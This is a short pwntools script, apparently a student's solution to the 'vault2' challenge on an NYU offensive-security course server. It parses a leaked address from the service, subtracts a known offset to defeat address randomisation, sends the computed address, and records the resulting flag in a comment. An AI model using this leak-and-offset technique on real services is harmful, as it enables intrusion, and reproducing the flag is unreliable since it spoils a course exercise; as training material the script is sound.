from pwn import *
import re

# context.log_level = "DEBUG"

CHALLENGE = "vault2"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1232
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

data = p.recvuntil(b"> ").decode()
print(data)
pattern = re.compile(r"0x[0-9a-fA-F]+")
fake_addr = int(pattern.findall(data).pop(), 16)
fake_offset = 0x4029
offset = 0x1269
addr = fake_addr - fake_offset + offset
p.sendline(hex(addr).encode())
log.info(f"Sending address in base 16: {hex(addr)}")

p.interactive()

# flag{wh0_n33ds_th3_BASE_1f_w3_h4v3_4_lEaK!_ead46bf902ab7a8c}
